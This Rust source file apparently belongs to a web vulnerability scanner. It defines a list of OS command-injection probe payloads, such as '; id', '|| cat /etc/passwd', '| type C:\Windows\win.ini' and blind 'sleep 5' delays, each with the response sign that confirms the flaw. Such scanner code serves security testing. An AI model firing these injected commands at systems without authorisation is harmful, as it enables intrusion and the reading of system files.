use crate::domain::active_vuln::{ExpectedIndicator, PayloadDefinition};
use crate::domain::entities::SeverityLevel;

pub fn get_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "cmdi_01".into(),
            payload: "; id".into(),
            description: "Semicolon command separator (Linux)".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_02".into(),
            payload: "| id".into(),
            description: "Pipe command chaining (Linux)".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_03".into(),
            payload: "& whoami".into(),
            description: "Ampersand background exec".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("root".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_04".into(),
            payload: "$(id)".into(),
            description: "Command substitution with $()".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_05".into(),
            payload: "`id`".into(),
            description: "Backtick command substitution".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_06".into(),
            payload: "| type C:\\Windows\\win.ini".into(),
            description: "Windows command injection via type".into(),
            expected_indicator: ExpectedIndicator::FileContent("[fonts]".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_07".into(),
            payload: "|| cat /etc/passwd".into(),
            description: "OR operator command injection".into(),
            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_08".into(),
            payload: "&& cat /etc/passwd".into(),
            description: "AND operator command injection".into(),
            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_09".into(),
            payload: "\n id".into(),
            description: "Newline separator (Linux)".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_10".into(),
            payload: "%0A id".into(),
            description: "URL encoded newline separator".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_11".into(),
            payload: "a; /bin/cat /etc/passwd".into(),
            description: "Prefix with command".into(),
            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_12".into(),
            payload: "|| whoami".into(),
            description: "Windows/Linux OR operator".into(),
            expected_indicator: ExpectedIndicator::ReflectedContent("root".into()),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        }
    ]
}

pub fn get_blind_payloads() -> Vec<PayloadDefinition> {
    vec![
        PayloadDefinition {
            id: "cmdi_blind_01".into(),
            payload: "; sleep 5".into(),
            description: "Time-based blind command injection (Linux)".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_blind_02".into(),
            payload: "| ping -c 5 127.0.0.1".into(),
            description: "Ping-based time delay (Linux)".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_blind_03".into(),
            payload: "& timeout /T 5".into(),
            description: "Time-based blind command injection (Windows)".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_blind_04".into(),
            payload: "|| sleep 5".into(),
            description: "OR Time-based delay (Linux)".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_blind_05".into(),
            payload: "`sleep 5`".into(),
            description: "Backtick time delay".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        PayloadDefinition {
            id: "cmdi_blind_06".into(),
            payload: "$(sleep 5)".into(),
            description: "Subshell time delay".into(),
            expected_indicator: ExpectedIndicator::TimeDelay(5000),
            severity: SeverityLevel::Critical,
            safe_for_production: true,
        },
        // Replaced OobCallback with ErrorPattern (or removed OOB payloads since expected indicator is not present)
    ]
}
